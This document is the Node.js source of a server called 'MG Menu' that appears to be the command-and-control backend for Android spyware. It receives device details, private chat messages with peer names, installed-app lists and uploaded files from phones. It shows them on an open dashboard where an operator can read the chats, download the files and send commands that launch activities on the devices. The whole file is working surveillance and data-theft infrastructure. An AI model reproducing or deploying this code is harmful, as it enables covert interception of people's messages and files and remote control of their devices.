import http from "node:http";
import { URL } from "node:url";
import { createClient } from "@supabase/supabase-js";
import fs from "node:fs";
import path from "node:path";

const PORT = process.env.PORT || 3000;

if (!process.env.SUPABASE_URL || !process.env.SUPABASE_SECRET_KEY) {
  console.error("Missing SUPABASE_URL or SUPABASE_SECRET_KEY");
  process.exit(1);
}

const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_SECRET_KEY, {
  auth: { persistSession: false }
});

process.on("unhandledRejection", (reason) => {
  console.error("Unhandled promise rejection:", reason);
});

process.on("uncaughtException", (error) => {
  console.error("Uncaught exception:", error);
});

const UPLOAD_DIR = path.join(process.cwd(), "uploads");
const THUMB_DIR = path.join(process.cwd(), "thumbs");
const LOG_FILE = path.join(process.cwd(), "logs.json");
const TRACK_FILE = path.join(process.cwd(), "tracks.json");
const CONFIG_FILE = path.join(process.cwd(), "config.json");

fs.mkdirSync(UPLOAD_DIR, { recursive: true });
fs.mkdirSync(THUMB_DIR, { recursive: true });

let command = {
  title: "MG Menu",
  text: "Server online",
  action: "none",
  activity: ""
};

function publicIp(req) {
  const forwarded = req.headers["x-forwarded-for"];
  if (typeof forwarded === "string" && forwarded.trim()) return forwarded.split(",")[0].trim();
  return req.socket.remoteAddress || "";
}

function clean(value) {
  return value == null ? "" : String(value);
}

function number(value) {
  const n = Number(value);
  return Number.isFinite(n) ? n : 0;
}

function optionalNumber(value) {
  const n = Number(value);
  return Number.isFinite(n) ? n : null;
}

function optionalClean(value) {
  const s = clean(value);
  return s ? s : null;
}

function nowIso() {
  return new Date().toISOString();
}

function nowMillis() {
  return Date.now();
}

function safeDecode(value) {
  try {
    return decodeURIComponent(value);
  } catch {
    return value;
  }
}

function safeName(name) {
  const base = path.basename(clean(name).replaceAll("\\", "/")).trim();
  return (base || "file").replace(/[^\w.\-() ]+/g, "_").slice(0, 180);
}

function json(res, status, data) {
  const body = JSON.stringify(data);
  res.writeHead(status, {
    "content-type": "application/json; charset=utf-8",
    "cache-control": "no-store",
    "access-control-allow-origin": "*"
  });
  res.end(body);
}

function text(res, status, body, type = "text/plain; charset=utf-8") {
  res.writeHead(status, {
    "content-type": type,
    "cache-control": "no-store",
    "access-control-allow-origin": "*"
  });
  res.end(body);
}

function notFound(res) {
  json(res, 404, { ok: false, error: "Not found" });
}

function collect(req, limit = 100 * 1024 * 1024) {
  return new Promise((resolve, reject) => {
    const chunks = [];
    let size = 0;
    req.on("data", (chunk) => {
      size += chunk.length;
      if (size > limit) {
        reject(new Error("Request body too large"));
        req.destroy();
        return;
      }
      chunks.push(chunk);
    });
    req.on("end", () => resolve(Buffer.concat(chunks)));
    req.on("error", reject);
  });
}

async function readJson(req, fallback = {}) {
  const body = await collect(req, 10 * 1024 * 1024);
  if (!body.length) return fallback;
  try {
    return JSON.parse(body.toString("utf8"));
  } catch {
    const params = new URLSearchParams(body.toString("utf8"));
    return Object.fromEntries(params.entries());
  }
}

async function readForm(req) {
  const body = await collect(req, 25 * 1024 * 1024);
  return Object.fromEntries(new URLSearchParams(body.toString("utf8")).entries());
}

function readLogs() {
  return readJsonFile(LOG_FILE);
}

function readTracks() {
  return readJsonFile(TRACK_FILE);
}

function readJsonFile(file) {
  try {
    if (!fs.existsSync(file)) return [];
    const raw = fs.readFileSync(file, "utf8").trim();
    if (!raw) return [];
    const parsed = JSON.parse(raw);
    return Array.isArray(parsed) ? parsed : [];
  } catch (error) {
    console.error(`Failed to read ${path.basename(file)}:`, error);
    return [];
  }
}

function writeLogs(logs) {
  fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2));
}

function writeTracks(tracks) {
  fs.writeFileSync(TRACK_FILE, JSON.stringify(tracks, null, 2));
}

function addLog(entry) {
  const logs = readLogs();
  logs.unshift(entry);
  writeLogs(logs);
}

function addTrack(entry) {
  const tracks = readTracks();
  tracks.unshift(entry);
  writeTracks(tracks.slice(0, 1000));
}

function contentType(file) {
  const ext = path.extname(file).toLowerCase();
  const map = {
    ".jpg": "image/jpeg",
    ".jpeg": "image/jpeg",
    ".png": "image/png",
    ".gif": "image/gif",
    ".webp": "image/webp",
    ".svg": "image/svg+xml",
    ".mp4": "video/mp4",
    ".webm": "video/webm",
    ".mov": "video/quicktime",
    ".mp3": "audio/mpeg",
    ".wav": "audio/wav",
    ".pdf": "application/pdf",
    ".txt": "text/plain; charset=utf-8",
    ".json": "application/json; charset=utf-8",
    ".zip": "application/zip"
  };
  return map[ext] || "application/octet-stream";
}

function sendFile(res, root, rawName) {
  const file = path.basename(safeDecode(rawName));
  const filePath = path.join(root, file);
  if (!file || !fs.existsSync(filePath) || !fs.statSync(filePath).isFile()) return notFound(res);
  res.writeHead(200, {
    "content-type": contentType(file),
    "content-length": fs.statSync(filePath).size,
    "cache-control": "public, max-age=86400",
    "access-control-allow-origin": "*"
  });
  fs.createReadStream(filePath).pipe(res);
}

function readConfigFlag() {
  try {
    if (!fs.existsSync(CONFIG_FILE)) return "1";
    const raw = fs.readFileSync(CONFIG_FILE, "utf8").trim();
    if (!raw) return "1";
    if (raw === "0" || raw === "1") return raw;
    const cfg = JSON.parse(raw);
    const value = cfg.enabled ?? cfg.config ?? cfg.active ?? cfg.value;
    return value === false || value === 0 || value === "0" ? "0" : "1";
  } catch {
    return "1";
  }
}

async function getDevices() {
  const { data, error } = await supabase
    .from("devices")
    .select("*")
    .order("server_last_seen", { ascending: false, nullsFirst: false });
  if (error) throw error;
  return data || [];
}

async function getMessages(deviceId = "") {
  let query = supabase.from("messages").select("*").order("received_at", { ascending: false });
  if (deviceId) query = query.eq("device_id", deviceId);
  const { data, error } = await query.limit(1000);
  if (error) throw error;
  return data || [];
}

function getFiles(deviceId = "") {
  return readLogs()
    .filter((item) => item && item.type === "file")
    .filter((item) => !deviceId || item.device_id === deviceId);
}

function isOnline(device) {
  const raw = device.server_last_seen;
  const t = typeof raw === "number" || /^\d+$/.test(String(raw || "")) ? Number(raw) : Date.parse(raw || "");
  return Number.isFinite(t) && Date.now() - t < 60_000;
}

async function devicesWithStats() {
  const [devices, messages] = await Promise.all([getDevices(), getMessages()]);
  const files = getFiles();
  const msgCounts = new Map();
  const fileCounts = new Map();

  for (const msg of messages) msgCounts.set(msg.device_id, (msgCounts.get(msg.device_id) || 0) + 1);
  for (const file of files) fileCounts.set(file.device_id, (fileCounts.get(file.device_id) || 0) + 1);

  return devices.map((device) => ({
    ...device,
    online: isOnline(device),
    display_name: device.my_name || device.public_id || device.device_id,
    message_count: msgCounts.get(device.device_id) || 0,
    file_count: fileCounts.get(device.device_id) || 0
  }));
}

async function handleHeartbeat(req, res) {
  const body = await readJson(req);
  const device_id = clean(body.device_id || body.deviceId || body.id || body.my_uid || body.myUid || body.public_id || body.publicId);
  if (!device_id) return json(res, 400, { ok: false, error: "device_id is required" });

  const row = {
    device_id,
    my_uid: optionalNumber(body.my_uid ?? body.myUid),
    public_id: optionalClean(body.public_id ?? body.publicId),
    my_name: optionalClean(body.my_name ?? body.myName ?? body.name),
    model: optionalClean(body.model),
    brand: optionalClean(body.brand),
    battery_percent: optionalNumber(body.battery_percent ?? body.battery),
    network_type: optionalClean(body.network_type || body.network),
    public_ip: optionalClean(publicIp(req)),
    server_last_seen: optionalNumber(body.lastSeen) || nowMillis()
  };

  const { error } = await supabase.from("devices").upsert(row, { onConflict: "device_id" });
  if (error) throw error;
  json(res, 200, { ok: true, device: row });
}

async function handleChatBatch(req, res) {
  const body = await readJson(req, []);
  const list = Array.isArray(body) ? body : Array.isArray(body.messages) ? body.messages : [];
  if (!list.length) return json(res, 400, { ok: false, error: "messages array is required" });
  const batchDeviceId = clean(body.device_id || body.deviceId);
  const batchMyUid = body.my_uid ?? body.myUid;

  const rows = list.map((msg) => ({
    device_id: clean(msg.device_id || msg.deviceId || batchDeviceId),
    mid: clean(msg.mid || msg.id),
    direction: clean(msg.direction),
    peer_uid: clean(msg.peer_uid ?? msg.peerUid),
    peer_name: clean(msg.peer_name ?? msg.peerName),
    text: clean(msg.text || msg.message),
    message_time: clean(msg.message_time ?? msg.messageTime ?? msg.time),
    received_at: nowIso()
  })).filter((msg) => msg.device_id);

  if (!rows.length) return json(res, 400, { ok: false, error: "valid device_id is required" });
  const { error } = await supabase.from("messages").insert(rows);
  if (error) throw error;
  if (batchDeviceId) {
    await supabase.from("devices").upsert({
      device_id: batchDeviceId,
      my_uid: optionalNumber(batchMyUid),
      public_id: optionalClean(body.public_id ?? body.publicId),
      public_ip: optionalClean(publicIp(req)),
      server_last_seen: nowMillis()
    }, { onConflict: "device_id" });
  }
  json(res, 200, { ok: true, saved: rows.length });
}

function fileNameFromHeaders(req, url) {
  const fromQuery = url.searchParams.get("filename") || url.searchParams.get("file") || url.searchParams.get("name") || url.searchParams.get("original");
  if (fromQuery) return fromQuery;
  const headerName = req.headers["x-filename"] || req.headers["x-file-name"];
  if (typeof headerName === "string" && headerName) return headerName;
  const disposition = req.headers["content-disposition"];
  if (typeof disposition === "string") {
    const match = disposition.match(/filename\*?=(?:UTF-8'')?"?([^";]+)"?/i);
    if (match) return safeDecode(match[1]);
  }
  return "upload.bin";
}

async function handleTrack(req, res) {
  const body = await readForm(req);
  const model = clean(body.model);
  const brand = clean(body.brand);
  const android = clean(body.android);
  const device_id = clean(body.device_id || body.deviceId || [model, brand, android].filter(Boolean).join("_") || publicIp(req) || "unknown");
  const apps = clean(body.apps);
  const appList = apps ? apps.split(",").map((app) => app.trim()).filter(Boolean) : [];

  const entry = {
    type: "track",
    device_id,
    ip: publicIp(req),
    battery: optionalNumber(body.battery),
    model,
    brand,
    android,
    apps,
    app_count: appList.length,
    time: nowIso()
  };
  addTrack(entry);

  const { error } = await supabase.from("devices").upsert({
    device_id,
    model,
    brand,
    battery_percent: optionalNumber(body.battery),
    network_type: clean(body.network_type || body.network),
    public_ip: publicIp(req),
    server_last_seen: nowMillis()
  }, { onConflict: "device_id" });
  if (error) throw error;

  json(res, 200, { ok: true, device_id, app_count: appList.length });
}

async function handleUpload(req, res, url) {
  const buffer = await collect(req);
  if (!buffer.length) return json(res, 400, { ok: false, error: "empty upload body" });

  const original = safeName(fileNameFromHeaders(req, url));
  const stamp = Date.now();
  const file = `${stamp}_${original}`;
  const thumb = `thumb_${stamp}_${original}`;
  const filePath = path.join(UPLOAD_DIR, file);
  const thumbPath = path.join(THUMB_DIR, thumb);

  fs.writeFileSync(filePath, buffer);
  fs.copyFileSync(filePath, thumbPath);

  const entry = {
    type: "file",
    file,
    original,
    thumb,
    device_id: clean(url.searchParams.get("device_id") || url.searchParams.get("deviceId") || req.headers["x-device-id"] || "unknown"),
    ip: publicIp(req),
    size: buffer.length,
    time: nowIso()
  };
  addLog(entry);
  json(res, 200, { ok: true, ...entry });
}

function handleDeleteFile(res, rawName) {
  const name = path.basename(safeDecode(rawName));
  const logs = readLogs();
  const item = logs.find((log) => log.file === name || log.thumb === name || log.original === name);
  const filesToDelete = new Set([name]);
  if (item?.file) filesToDelete.add(item.file);
  if (item?.thumb) filesToDelete.add(item.thumb);

  for (const file of filesToDelete) {
    for (const root of [UPLOAD_DIR, THUMB_DIR]) {
      const target = path.join(root, path.basename(file));
      if (fs.existsSync(target)) fs.rmSync(target, { force: true });
    }
  }

  writeLogs(logs.filter((log) => log.file !== name && log.thumb !== name && log.original !== name));
  json(res, 200, { ok: true, deleted: name });
}

async function dashboardHtml() {
  return `<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>MG Menu Dashboard</title>
<style>
:root{color-scheme:dark;--bg:#090b10;--panel:#111620;--panel2:#161d29;--line:#273140;--text:#edf2f7;--muted:#9aa8ba;--accent:#36c5f0;--ok:#34d399;--bad:#7b8494;--danger:#fb7185;--warn:#fbbf24}
*{box-sizing:border-box}body{margin:0;background:var(--bg);color:var(--text);font-family:Inter,ui-sans-serif,system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;font-size:14px}
button,input,select{font:inherit}button{border:0;cursor:pointer}.app{display:grid;grid-template-columns:320px 1fr;min-height:100vh}.side{border-right:1px solid var(--line);background:#0d1119;display:flex;flex-direction:column;min-width:0}.brand{padding:18px 18px 14px;border-bottom:1px solid var(--line)}.brand h1{font-size:18px;margin:0 0 10px}.search{width:100%;background:#090d14;color:var(--text);border:1px solid var(--line);border-radius:8px;padding:10px 12px;outline:none}.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;padding:12px 18px;border-bottom:1px solid var(--line)}.stat{background:var(--panel);border:1px solid var(--line);border-radius:8px;padding:10px}.stat b{display:block;font-size:18px}.stat span{color:var(--muted);font-size:12px}.devices{overflow:auto;padding:10px}.device{width:100%;text-align:left;color:var(--text);background:transparent;border-radius:8px;padding:11px;margin-bottom:6px;border:1px solid transparent}.device:hover,.device.active{background:var(--panel);border-color:var(--line)}.devtop{display:flex;align-items:center;gap:9px;min-width:0}.dot{width:9px;height:9px;border-radius:50%;background:var(--bad);flex:none}.dot.on{background:var(--ok);box-shadow:0 0 14px #34d39980}.devname{font-weight:700;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.devmeta{display:flex;gap:12px;color:var(--muted);font-size:12px;margin:7px 0 0 18px}.main{min-width:0;display:flex;flex-direction:column}.topbar{display:flex;align-items:center;justify-content:space-between;gap:14px;padding:18px 22px;border-bottom:1px solid var(--line);background:#0b0f16}.title{min-width:0}.title h2{margin:0;font-size:22px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.title p{margin:4px 0 0;color:var(--muted)}.actions{display:flex;gap:8px}.btn{background:var(--panel2);color:var(--text);border:1px solid var(--line);border-radius:8px;padding:9px 11px;text-decoration:none}.btn:hover{border-color:var(--accent)}.btn.danger{color:#ffe4e6;border-color:#883142;background:#301018}.tabs{display:flex;gap:6px;padding:12px 22px 0;background:#0b0f16}.tab{padding:10px 13px;border-radius:8px 8px 0 0;background:transparent;color:var(--muted)}.tab.active{background:var(--panel);color:var(--text)}.commandbar{display:grid;grid-template-columns:1fr 1.4fr 160px 1.4fr auto auto;gap:8px;padding:12px 22px;border-bottom:1px solid var(--line);background:var(--panel)}.commandbar input,.commandbar select{min-width:0;background:#090d14;color:var(--text);border:1px solid var(--line);border-radius:8px;padding:9px 10px;outline:none}.content{padding:20px 22px;overflow:auto;flex:1;background:linear-gradient(180deg,#0b0f16 0,#090b10 170px)}.cards{display:grid;grid-template-columns:repeat(4,minmax(140px,1fr));gap:12px;margin-bottom:18px}.card{background:var(--panel);border:1px solid var(--line);border-radius:8px;padding:14px}.card span{display:block;color:var(--muted);font-size:12px}.card b{display:block;margin-top:5px;font-size:20px}.info{display:grid;grid-template-columns:repeat(2,minmax(220px,1fr));gap:12px}.row{display:flex;justify-content:space-between;gap:14px;padding:12px 14px;background:var(--panel);border:1px solid var(--line);border-radius:8px}.row span{color:var(--muted)}.messages{display:flex;flex-direction:column;gap:10px}.msg{max-width:780px;background:var(--panel);border:1px solid var(--line);border-radius:8px;padding:12px}.msg.out{margin-left:auto;border-color:#23546a}.msghead{display:flex;justify-content:space-between;gap:10px;color:var(--muted);font-size:12px;margin-bottom:6px}.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:12px}.file{background:var(--panel);border:1px solid var(--line);border-radius:8px;overflow:hidden}.thumb{aspect-ratio:1.35;background:#070a10;display:grid;place-items:center;color:var(--muted);font-size:38px}.thumb img,.thumb video{width:100%;height:100%;object-fit:cover}.filebody{padding:10px}.filename{font-weight:700;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.filemeta{color:var(--muted);font-size:12px;margin:5px 0 10px}.fileactions{display:flex;gap:8px}.empty{color:var(--muted);padding:40px;text-align:center;border:1px dashed var(--line);border-radius:8px;background:#0d111980}.modal{position:fixed;inset:0;background:#000a;display:none;align-items:center;justify-content:center;padding:24px;z-index:10}.modal.open{display:flex}.modalbox{background:var(--panel);border:1px solid var(--line);border-radius:8px;width:min(1000px,96vw);max-height:92vh;overflow:hidden}.modalhead{display:flex;justify-content:space-between;align-items:center;gap:12px;padding:12px 14px;border-bottom:1px solid var(--line)}.modalbody{padding:14px;display:grid;place-items:center;max-height:78vh;overflow:auto}.modalbody img,.modalbody video{max-width:100%;max-height:72vh}.hidden{display:none!important}
@media (max-width:850px){.app{grid-template-columns:1fr}.side{max-height:44vh;border-right:0;border-bottom:1px solid var(--line)}.topbar{align-items:flex-start;flex-direction:column}.commandbar{grid-template-columns:1fr 1fr}.cards,.info{grid-template-columns:1fr 1fr}.content{padding:16px}.tabs{padding-left:16px}.grid{grid-template-columns:repeat(auto-fill,minmax(150px,1fr))}}
@media (max-width:520px){.cards,.info,.commandbar{grid-template-columns:1fr}.stats{grid-template-columns:repeat(3,1fr);padding:10px}.brand{padding:14px}.topbar{padding:16px}.actions{width:100%}.btn{flex:1;text-align:center}.tabs{overflow:auto}.tab{white-space:nowrap}}
</style>
</head>
<body>
<div class="app">
  <aside class="side">
    <div class="brand"><h1>MG Menu Dashboard</h1><input id="search" class="search" placeholder="Search devices"></div>
    <div class="stats"><div class="stat"><b id="totalDevices">0</b><span>Devices</span></div><div class="stat"><b id="onlineDevices">0</b><span>Online</span></div><div class="stat"><b id="totalFiles">0</b><span>Files</span></div></div>
    <div id="devices" class="devices"></div>
  </aside>
  <main class="main">
    <div class="topbar"><div class="title"><h2 id="deviceTitle">Select a device</h2><p id="deviceSub">Device details, chats, and files appear here.</p></div><div class="actions"><button class="btn" id="refresh">Refresh</button><a class="btn" href="/api/debug" target="_blank">Debug</a></div></div>
    <div class="tabs"><button class="tab active" data-tab="info">Info</button><button class="tab" data-tab="chats">Chats</button><button class="tab" data-tab="files">Files</button></div>
    <div class="commandbar">
      <input id="cmdTitle" placeholder="Menu title" value="MG Menu">
      <input id="cmdText" placeholder="Text to show in app">
      <select id="cmdAction"><option value="none">none</option><option value="launch_activity">launch_activity</option><option value="open_activity">open_activity</option><option value="toast">toast</option></select>
      <input id="cmdActivity" placeholder="Activity class" value="com.wepie.module.teenmode.TeenModeOpeningActivity">
      <button class="btn" id="sendCommand">Send</button>
      <button class="btn danger" id="clearCommand">Clear</button>
    </div>
    <section id="content" class="content"></section>
  </main>
</div>
<div id="modal" class="modal"><div class="modalbox"><div class="modalhead"><strong id="modalTitle"></strong><button class="btn" id="closeModal">Close</button></div><div id="modalBody" class="modalbody"></div></div></div>
<script>
const state={devices:[],selected:null,tab:"info",messages:[],files:[]};
const $=id=>document.getElementById(id);
const fmtDate=v=>{if(!v)return "";const d=/^\\d+$/.test(String(v))?new Date(Number(v)):new Date(v);return Number.isFinite(d.getTime())?d.toLocaleString():String(v)};
const fmtBytes=n=>{n=Number(n)||0;const u=["B","KB","MB","GB"];let i=0;while(n>=1024&&i<u.length-1){n/=1024;i++}return n.toFixed(i?1:0)+" "+u[i]};
const esc=s=>String(s??"").replace(/[&<>"']/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]));
const isImg=f=>/\\.(png|jpe?g|gif|webp|svg)$/i.test(f||"");
const isVid=f=>/\\.(mp4|webm|mov)$/i.test(f||"");
async function api(url,opts){const r=await fetch(url,opts);if(!r.ok)throw new Error(await r.text());return r.json()}
async function load(){state.devices=await api("/api/devices"); if(!state.selected&&state.devices[0]) state.selected=state.devices[0].device_id; renderDevices(); await loadSelected()}
async function loadSelected(){if(!state.selected){renderEmpty();return} const [messages,files]=await Promise.all([api("/api/device/"+encodeURIComponent(state.selected)+"/messages"),api("/api/device/"+encodeURIComponent(state.selected)+"/files")]); state.messages=messages; state.files=files; renderMain()}
function renderDevices(){const q=$("search").value.toLowerCase();const list=state.devices.filter(d=>(d.display_name||d.device_id||"").toLowerCase().includes(q));$("totalDevices").textContent=state.devices.length;$("onlineDevices").textContent=state.devices.filter(d=>d.online).length;$("totalFiles").textContent=state.devices.reduce((a,d)=>a+(d.file_count||0),0);$("devices").innerHTML=list.map(d=>'<button class="device '+(d.device_id===state.selected?'active':'')+'" data-id="'+esc(d.device_id)+'"><div class="devtop"><span class="dot '+(d.online?'on':'')+'"></span><span class="devname">'+esc(d.display_name||d.device_id)+'</span></div><div class="devmeta"><span>Files '+(d.file_count||0)+'</span><span>Chats '+(d.message_count||0)+'</span></div></button>').join("")||'<div class="empty">No devices found</div>'}
function selectedDevice(){return state.devices.find(d=>d.device_id===state.selected)}
function renderEmpty(){$("content").innerHTML='<div class="empty">No device selected</div>'}
function renderMain(){const d=selectedDevice(); if(!d)return renderEmpty(); $("deviceTitle").textContent=d.display_name||d.device_id; $("deviceSub").textContent=(d.online?"Online":"Offline")+" • Last seen "+fmtDate(d.server_last_seen); document.querySelectorAll(".tab").forEach(t=>t.classList.toggle("active",t.dataset.tab===state.tab)); if(state.tab==="info")renderInfo(d); if(state.tab==="chats")renderChats(); if(state.tab==="files")renderFiles()}
function renderInfo(d){$("content").innerHTML='<div class="cards"><div class="card"><span>Status</span><b>'+(d.online?'Online':'Offline')+'</b></div><div class="card"><span>Battery</span><b>'+(d.battery_percent??0)+'%</b></div><div class="card"><span>Files</span><b>'+state.files.length+'</b></div><div class="card"><span>Messages</span><b>'+state.messages.length+'</b></div></div><div class="info">'+["device_id","my_uid","public_id","my_name","brand","model","network_type","public_ip","server_last_seen","created_at"].map(k=>'<div class="row"><span>'+esc(k)+'</span><strong>'+esc(d[k]??"")+'</strong></div>').join("")+'</div>'}
function renderChats(){if(!state.messages.length){$("content").innerHTML='<div class="empty">No messages for this device</div>';return} $("content").innerHTML='<div class="messages">'+state.messages.map(m=>'<div class="msg '+esc(m.direction)+'"><div class="msghead"><span>'+esc(m.direction||"")+' • '+esc(m.peer_name||m.peer_uid||"Unknown")+'</span><span>'+esc(fmtDate(m.received_at||m.message_time))+'</span></div><div>'+esc(m.text||"")+'</div></div>').join("")+'</div>'}
function renderFiles(){if(!state.files.length){$("content").innerHTML='<div class="empty">No files for this device</div>';return} $("content").innerHTML='<div class="grid">'+state.files.map(f=>{const url="/uploads/"+encodeURIComponent(f.file);const media=isImg(f.file)?'<img src="'+url+'" alt="">':isVid(f.file)?'<video src="'+url+'" muted></video>':'<span>FILE</span>';return '<div class="file"><button class="thumb" data-preview="'+esc(f.file)+'">'+media+'</button><div class="filebody"><div class="filename" title="'+esc(f.original||f.file)+'">'+esc(f.original||f.file)+'</div><div class="filemeta">'+fmtBytes(f.size)+' • '+esc(fmtDate(f.time))+'</div><div class="fileactions"><a class="btn" href="'+url+'" download>Download</a><button class="btn danger" data-delete="'+esc(f.file)+'">Delete</button></div></div></div>'}).join("")+'</div>'}
function openPreview(file){const url="/uploads/"+encodeURIComponent(file);$("modalTitle").textContent=file;$("modalBody").innerHTML=isImg(file)?'<img src="'+url+'" alt="">':isVid(file)?'<video src="'+url+'" controls autoplay></video>':'<a class="btn" href="'+url+'" target="_blank">Open file</a>';$("modal").classList.add("open")}
$("devices").onclick=e=>{const b=e.target.closest(".device");if(!b)return;state.selected=b.dataset.id;renderDevices();loadSelected()};
$("search").oninput=renderDevices;$("refresh").onclick=load;document.querySelector(".tabs").onclick=e=>{const b=e.target.closest(".tab");if(!b)return;state.tab=b.dataset.tab;renderMain()};
$("sendCommand").onclick=async()=>{await api("/panel/command",{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({title:$("cmdTitle").value,text:$("cmdText").value,action:$("cmdAction").value,activity:$("cmdActivity").value})});$("sendCommand").textContent="Sent";setTimeout(()=>$("sendCommand").textContent="Send",1200)};
$("clearCommand").onclick=async()=>{$("cmdText").value="";$("cmdAction").value="none";$("cmdActivity").value="";await api("/panel/command",{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({title:"MG Menu",text:"Server online",action:"none",activity:""})})};
$("content").onclick=async e=>{const p=e.target.closest("[data-preview]");if(p)openPreview(p.dataset.preview);const d=e.target.closest("[data-delete]");if(d&&confirm("Delete this file?")){await fetch("/api/file/"+encodeURIComponent(d.dataset.delete),{method:"DELETE"});await load()}};
$("closeModal").onclick=()=>$("modal").classList.remove("open");$("modal").onclick=e=>{if(e.target.id==="modal")$("modal").classList.remove("open")};
load().catch(err=>{$("content").innerHTML='<div class="empty">Failed to load dashboard: '+esc(err.message)+'</div>'});
</script>
</body>
</html>`;
}

async function handleDashboardApi(req, res, url) {
  const parts = url.pathname.split("/").filter(Boolean).map(safeDecode);

  if (url.pathname === "/api/devices") {
    return json(res, 200, await devicesWithStats());
  }

  if (url.pathname === "/api/tracks") return json(res, 200, readTracks());

  if (parts[0] === "api" && parts[1] === "device" && parts[2]) {
    const deviceId = parts[2];
    if (parts.length === 3) {
      const devices = await devicesWithStats();
      const device = devices.find((item) => item.device_id === deviceId);
      return device ? json(res, 200, device) : notFound(res);
    }
    if (parts[3] === "messages") return json(res, 200, await getMessages(deviceId));
    if (parts[3] === "files") return json(res, 200, getFiles(deviceId));
    if (parts[3] === "tracks") return json(res, 200, readTracks().filter((item) => item.device_id === deviceId));
  }

  return false;
}

async function handler(req, res) {
  const url = new URL(req.url || "/", `http://${req.headers.host || "localhost"}`);

  if (req.method === "OPTIONS") {
    res.writeHead(204, {
      "access-control-allow-origin": "*",
      "access-control-allow-methods": "GET,POST,DELETE,OPTIONS",
      "access-control-allow-headers": "content-type,x-device-id,x-filename,x-file-name"
    });
    return res.end();
  }

  try {
    if (req.method === "GET" && url.pathname === "/") return text(res, 200, await dashboardHtml(), "text/html; charset=utf-8");
    if (req.method === "GET" && url.pathname === "/config") return text(res, 200, readConfigFlag());
    if (req.method === "POST" && url.pathname === "/api/heartbeat") return await handleHeartbeat(req, res);
    if (req.method === "POST" && url.pathname === "/api/chat/batch") return await handleChatBatch(req, res);
    if (req.method === "POST" && url.pathname === "/track") return await handleTrack(req, res);
    if (req.method === "POST" && url.pathname === "/upload") return await handleUpload(req, res, url);

    if (req.method === "GET" && url.pathname === "/api/files") {
      const deviceId = clean(url.searchParams.get("device_id") || url.searchParams.get("id"));
      return json(res, 200, getFiles(deviceId));
    }

    if (req.method === "GET" && url.pathname === "/api/all-files") return json(res, 200, getFiles());
    if (req.method === "GET" && url.pathname.startsWith("/uploads/")) return sendFile(res, UPLOAD_DIR, url.pathname.slice("/uploads/".length));
    if (req.method === "GET" && url.pathname.startsWith("/thumbs/")) return sendFile(res, THUMB_DIR, url.pathname.slice("/thumbs/".length));
    if (req.method === "DELETE" && url.pathname.startsWith("/api/file/")) return handleDeleteFile(res, url.pathname.slice("/api/file/".length));

    if (req.method === "GET" && url.pathname === "/api/debug") {
      const [devices, messages] = await Promise.all([getDevices(), getMessages()]);
      return json(res, 200, { ok: true, devices, messages, files: getFiles(), tracks: readTracks(), command, config: readConfigFlag() });
    }

    if (req.method === "POST" && url.pathname === "/panel/command") {
      const body = await readJson(req);
      command = {
        title: Object.hasOwn(body, "title") ? clean(body.title) : command.title,
        text: Object.hasOwn(body, "text") ? clean(body.text) : Object.hasOwn(body, "message") ? clean(body.message) : command.text,
        action: Object.hasOwn(body, "action") ? clean(body.action) : command.action,
        activity: Object.hasOwn(body, "activity") ? clean(body.activity) : command.activity
      };
      return json(res, 200, { ok: true, command });
    }

    if (req.method === "GET" && url.pathname === "/api/data") return json(res, 200, command);

    const dashboardHandled = req.method === "GET" ? await handleDashboardApi(req, res, url) : false;
    if (dashboardHandled !== false) return;

    return notFound(res);
  } catch (error) {
    console.error(`${req.method} ${url.pathname}:`, error);
    return json(res, 500, { ok: false, error: error.message || "Internal server error" });
  }
}

http.createServer(handler).listen(PORT, () => {
  console.log(`MG Menu server running on port ${PORT}`);
});
